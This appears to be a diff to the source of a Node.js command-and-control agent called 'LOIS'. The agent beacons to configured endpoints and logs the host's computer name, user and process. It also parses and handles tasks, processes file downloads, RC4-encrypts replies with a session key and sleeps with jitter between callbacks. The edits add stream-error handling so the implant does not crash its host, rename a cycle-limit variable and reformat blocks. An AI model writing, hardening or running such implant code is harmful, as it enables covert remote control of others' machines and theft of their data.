@@ -40,6 +40,9 @@ function request(cfg, headerValue, body, ep) {
     }, (res) => {
       const chunks = [];
       res.on('data', (c) => chunks.push(c));
+      // a response-stream error (server dies mid-body) without a listener
+      // throws an uncaughtException — fatal in a host's main process (003)
+      res.on('error', reject);
       res.on('end', () => resolve({ status: res.statusCode, body: Buffer.concat(chunks) }));
     });
     req.on('error', reject);
@@ -135,7 +138,7 @@ async function run() {
   log(`[*] LOIS agent_id=${cfg.agent_id.toString(16)} -> ${cfg.ssl ? 'https' : 'http'}://${cfg.endpoints[0].host}:${cfg.endpoints[0].port}${cfg.uri}`);
   log(`[*] host: ${info.computer_name} user=${info.username} proc=${info.process_name}`);
 
-  const maxCycles = process.env.MAX_CYCLES ? parseInt(process.env.MAX_CYCLES, 10) : Infinity;
+  const maxCycles = process.env.LOIS_MAX_CYCLES ? parseInt(process.env.LOIS_MAX_CYCLES, 10) : Infinity;
   const state = fsops.createState();
   let cycles = 0, terminate = false, pendingReply = null;
 
@@ -159,14 +162,20 @@ async function run() {
               if (h) { handled++; if (h.reply) outputs.parts.push(...h.reply.parts); }
               if (h && h.exit) terminate = true;
             }
-          } catch (e) { log(`[-] task parse error: ${e.message}`); }
+          } catch (e) {
+            log(`[-] task parse error: ${e.message}`);
+          }
           fsops.processDownloads(state, outputs, cfg);
           if (outputs.parts.length) {
             const built = outputs.build();
-            if (cfg.debug) log(`[dbg] reply plain (${built.length}B): ${built.toString('hex')}`);
+            if (cfg.debug) {
+              log(`[dbg] reply plain (${built.length}B): ${built.toString('hex')}`);
+            }
             pendingReply = rc4(built, sessionKey);
           }
-          if (handled) log(`[+] ${handled} task(s) — reply queued`);
+          if (handled) {
+            log(`[+] ${handled} task(s) — reply queued`);
+          }
         } else {
           const outputs = new OutPacker();
           fsops.processDownloads(state, outputs, cfg);
@@ -179,8 +188,14 @@ async function run() {
       log(`[-] callback error: ${err.message}`);
     }
 
-    if (++cycles >= maxCycles) { log('[=] MAX_CYCLES reached'); break; }
-    if (terminate) { log('[=] TERMINATE'); break; }
+    if (++cycles >= maxCycles) {
+      log('[=] MAX_CYCLES reached');
+      break;
+    }
+    if (terminate) {
+      log('[=] TERMINATE');
+      break;
+    }
     await new Promise((r) => setTimeout(r, jittered(cfg)));
   }
 }
